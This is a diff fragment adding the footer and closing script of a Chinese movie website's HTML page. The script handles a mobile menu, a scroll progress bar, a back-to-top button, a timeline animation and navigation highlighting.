+    <div class="foot-bottom">© 2026 怕怕怕电影网 papapadianyingwang-h5.github.io 保留所有权利</div>
+  </div>
+</footer>
+
+<button id="toTop" aria-label="回到顶部">↑</button>
+
+<script>
+// 移动端菜单
+const menuToggle=document.getElementById('menuToggle');
+const navLinks=document.getElementById('navLinks');
+menuToggle.addEventListener('click',()=>navLinks.classList.toggle('open'));
+navLinks.querySelectorAll('a').forEach(a=>a.addEventListener('click',()=>navLinks.classList.remove('open')));
+
+// 滚动进度条 + 回到顶部
+const progress=document.getElementById('progressbar');
+const toTop=document.getElementById('toTop');
+window.addEventListener('scroll',()=>{
+  const st=document.documentElement.scrollTop||document.body.scrollTop;
+  const h=document.documentElement.scrollHeight-document.documentElement.clientHeight;
+  progress.style.width=(st/h*100)+'%';
+  toTop.classList.toggle('show',st>400);
+  // header 阴影
+  document.getElementById('header').style.boxShadow=st>50?'0 4px 30px rgba(0,0,0,.6)':'none';
+});
+toTop.addEventListener('click',()=>window.scrollTo({top:0,behavior:'smooth'}));
+
+// 时间线入场动画
+const tlItems=document.querySelectorAll('.tl-item');
+const tlObs=new IntersectionObserver((entries)=>{
+  entries.forEach(e=>{if(e.isIntersecting){e.target.classList.add('visible');tlObs.unobserve(e.target);}});
+},{threshold:.2});
+tlItems.forEach(el=>tlObs.observe(el));
+
+// 导航高亮
+const sections=document.querySelectorAll('section[id]');
+const navAs=document.querySelectorAll('.nav-links a');
+window.addEventListener('scroll',()=>{
+  let cur='';
+  sections.forEach(s=>{if(window.scrollY>=s.offsetTop-120)cur=s.id;});
+  navAs.forEach(a=>a.classList.toggle('active',a.getAttribute('href')==='#'+cur));
+},{passive:true});
+</script>
+</body>
+</html>
